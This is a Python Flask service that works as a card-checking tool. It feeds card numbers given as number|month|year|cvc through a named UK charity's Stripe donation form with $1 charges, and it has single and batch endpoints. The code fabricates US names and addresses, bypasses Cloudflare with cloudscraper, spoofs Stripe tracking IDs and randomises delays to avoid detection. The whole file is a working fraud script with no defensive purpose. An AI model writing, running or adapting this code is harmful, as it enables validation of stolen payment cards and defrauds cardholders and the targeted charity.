from flask import Flask, request, jsonify
import requests
import json
import random
import re
import time
from typing import Dict
import cloudscraper

app = Flask(__name__)

class USAddressGenerator:
    LOCATIONS = [
        {"city": "New York", "state": "NY", "zip": "10001", "state_full": "New York"},
        {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_full": "California"},
        {"city": "Chicago", "state": "IL", "zip": "60601", "state_full": "Illinois"},
        {"city": "Houston", "state": "TX", "zip": "77001", "state_full": "Texas"},
        {"city": "Phoenix", "state": "AZ", "zip": "85001", "state_full": "Arizona"},
        {"city": "Philadelphia", "state": "PA", "zip": "19019", "state_full": "Pennsylvania"},
        {"city": "San Antonio", "state": "TX", "zip": "78201", "state_full": "Texas"},
        {"city": "San Diego", "state": "CA", "zip": "92101", "state_full": "California"},
        {"city": "Dallas", "state": "TX", "zip": "75201", "state_full": "Texas"},
        {"city": "Austin", "state": "TX", "zip": "78701", "state_full": "Texas"},
    ]
    
    FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
    STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Ave", "Lake St", "Hill St", "Park Ave"]
    
    @classmethod
    def generate_address(cls) -> Dict[str, str]:
        location = random.choice(cls.LOCATIONS)
        street_num = random.randint(100, 9999)
        street = random.choice(cls.STREETS)
        
        return {
            "first_name": random.choice(cls.FIRST_NAMES),
            "last_name": random.choice(cls.LAST_NAMES),
            "address": f"{street_num} {street}",
            "address_2": random.choice(["", f"Apt {random.randint(1, 50)}", f"#{random.randint(1, 100)}", ""]),
            "city": location["city"],
            "state": location["state"],
            "state_full": location["state_full"],
            "zip": location["zip"],
            "email": f"{random.choice(cls.FIRST_NAMES).lower()}{random.randint(1, 999)}@gmail.com"
        }

class BravehoundDonationBot:
    def __init__(self, card_data: str):
        parts = card_data.split('|')
        self.card_number = parts[0].strip()
        self.exp_month = parts[1].strip()
        self.exp_year = parts[2].strip()
        self.cvc = parts[3].strip()
        
        # Create cloudscraper session to bypass Cloudflare
        self.scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'mobile': False
            }
        )
        
        self.address = USAddressGenerator.generate_address()
        self.form_hash = None
        self.payment_method_id = None
        
    def get_form_hash(self):
        url = "https://www.bravehound.co.uk/wp-admin/admin-ajax.php"
        
        # Rotating headers
        headers = {
            'X-Requested-With': "XMLHttpRequest",
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'Origin': "https://www.bravehound.co.uk",
            'Referer': "https://www.bravehound.co.uk/donation/",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Language': "en-US,en;q=0.9",
            'Accept-Encoding': "gzip, deflate, br",
            'Connection': "keep-alive",
            'Sec-Fetch-Dest': "empty",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Site': "same-origin",
        }
        
        payload = {
            'action': "give_donation_form_reset_all_nonce",
            'give_form_id': "13302"
        }
        
        response = self.scraper.post(url, data=payload, headers=headers, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            self.form_hash = data['data']['give_form_hash']
            return self.form_hash
        else:
            raise Exception(f"Failed to get form hash: Status {response.status_code}")
    
    def create_payment_method(self):
        url = "https://api.stripe.com/v1/payment_methods"
        
        payload = {
            'type': "card",
            'billing_details[name]': f"{self.address['first_name']} {self.address['last_name']}",
            'billing_details[email]': self.address['email'],
            'card[number]': self.card_number,
            'card[cvc]': self.cvc,
            'card[exp_month]': self.exp_month,
            'card[exp_year]': self.exp_year[-2:],
            'guid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}",
            'muid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}",
            'sid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}",
            'payment_user_agent': "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; split-card-element",
            'referrer': "https://www.bravehound.co.uk",
            'time_on_page': str(random.randint(30000, 50000)),
            'key': "pk_live_SMtnnvlq4TpJelMdklNha8iD",
            '_stripe_account': "acct_1GZhGGEfZQ9gHa50",
        }
        
        headers = {
            'Accept': "application/json",
            'Content-Type': "application/x-www-form-urlencoded",
            'Origin': "https://js.stripe.com",
            'Referer': "https://js.stripe.com/",
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        
        response = self.scraper.post(url, data=payload, headers=headers, timeout=30)
        data = response.json()
        
        if 'id' in data:
            self.payment_method_id = data['id']
            return self.payment_method_id
        else:
            error_msg = data.get('error', {}).get('message', 'Unknown error')
            raise Exception(f"Stripe error: {error_msg}")
    
    def submit_donation(self):
        url = "https://www.bravehound.co.uk/donation/"
        
        params = {
            'payment-mode': "stripe",
            'form-id': "13302"
        }
        
        payload = {
            'give-honeypot': "",
            'give-form-id-prefix': "13302-1",
            'give-form-id': "13302",
            'give-form-title': "Bravehound Donations",
            'give-current-url': "https://www.bravehound.co.uk/donation/",
            'give-form-url': "https://www.bravehound.co.uk/donation/",
            'give-form-minimum': "1.00",
            'give-form-maximum': "999999.99",
            'give-form-hash': self.form_hash,
            'give-price-id': "custom",
            'give-recurring-logged-in-only': "",
            'give-logged-in-only': "1",
            '_give_is_donation_recurring': "0",
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': "1.00",
            'give_stripe_payment_method': self.payment_method_id,
            'payment-mode': "stripe",
            'give_first': self.address['first_name'],
            'give_last': self.address['last_name'],
            'give_email': self.address['email'],
            'card_name': f"{self.address['first_name']} {self.address['last_name']}",
            'give_gift_check_is_billing_address': "yes",
            'give_gift_aid_address_option': "billing_address",
            'give_gift_aid_card_first_name': "",
            'give_gift_aid_card_last_name': "",
            'give_gift_aid_billing_country': "US",
            'give_gift_aid_card_address': self.address['address'],
            'give_gift_aid_card_address_2': self.address['address_2'],
            'give_gift_aid_card_city': self.address['city'],
            'give_gift_aid_card_state': self.address['state'],
            'give_gift_aid_card_zip': self.address['zip'],
            'give_action': "purchase",
            'give-gateway': "stripe"
        }
        
        headers = {
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            'Content-Type': "application/x-www-form-urlencoded",
            'Origin': "https://www.bravehound.co.uk",
            'Referer': "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe&level-id=custom&custom-amount=1.00",
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            'Upgrade-Insecure-Requests': "1",
        }
        
        response = self.scraper.post(url, params=params, data=payload, headers=headers, timeout=30, allow_redirects=True)
        return self._parse_response(response.text)
    
    def _parse_response(self, response_text):
        # Success messages
        if any(word in response_text.lower() for word in ['thank you', 'donation confirmed', 'successfully', 'succeeded']):
            return {"status": "success", "message": "Charged $1"}
        
        # Error messages
        if 'card_declined' in response_text.lower():
            return {"status": "error", "message": "Card declined"}
        if 'insufficient funds' in response_text.lower():
            return {"status": "error", "message": "Insufficient funds"}
        if 'your card was declined' in response_text.lower():
            return {"status": "error", "message": "Card declined"}
        
        # Extract error from HTML
        error_patterns = [
            r'<div class="give_error[^"]*">(.*?)</div>',
            r'<strong>Error</strong>:(.*?)<br',
            r'<p class="give_error">(.*?)</p>'
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.DOTALL | re.IGNORECASE)
            if match:
                error_text = re.sub(r'<[^>]+>', '', match.group(1)).strip()
                return {"status": "error", "message": error_text}
        
        return {"status": "error", "message": "Donation failed"}
    
    def run(self):
        try:
            # Step 1: Get form hash
            self.get_form_hash()
            time.sleep(random.uniform(1, 2))
            
            # Step 2: Create payment method
            self.create_payment_method()
            time.sleep(random.uniform(1, 2))
            
            # Step 3: Submit donation
            result = self.submit_donation()
            
            # Add card and address info
            result["card"] = self.card_number
            result["address"] = f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
            
            return result
            
        except Exception as e:
            return {
                "status": "error",
                "message": str(e),
                "card": self.card_number,
                "address": None
            }

@app.route('/strip', methods=['GET'])
def strip_check():
    cc = request.args.get('cc')
    
    if not cc:
        return jsonify({"error": "cc parameter required", "status": "error"}), 400
    
    parts = cc.split('|')
    if len(parts) != 4:
        return jsonify({"error": "Invalid format. Use: number|month|year|cvc", "status": "error"}), 400
    
    bot = BravehoundDonationBot(cc)
    result = bot.run()
    
    return jsonify({
        "card": result.get("card"),
        "address": result.get("address"),
        "status": result.get("status"),
        "message": result.get("message")
    })

@app.route('/strip_batch', methods=['POST'])
def strip_batch():
    data = request.get_json()
    
    if not data or 'cards' not in data:
        return jsonify({"error": "cards array required", "status": "error"}), 400
    
    cards = data['cards']
    results = []
    
    for idx, card_data in enumerate(cards):
        parts = card_data.split('|')
        if len(parts) != 4:
            results.append({
                "card": card_data.split('|')[0] if '|' in card_data else card_data,
                "address": None,
                "status": "error",
                "message": "Invalid format"
            })
            continue
        
        bot = BravehoundDonationBot(card_data)
        result = bot.run()
        results.append({
            "card": result.get("card"),
            "address": result.get("address"),
            "status": result.get("status"),
            "message": result.get("message")
        })
        
        # Delay between requests
        if idx < len(cards) - 1:
            time.sleep(random.uniform(2, 4))
    
    return jsonify({
        "total": len(results),
        "success": sum(1 for r in results if r['status'] == 'success'),
        "error": sum(1 for r in results if r['status'] == 'error'),
        "results": results
    })

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({
        "status": "healthy",
        "message": "Server is running on Railway without proxy"
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
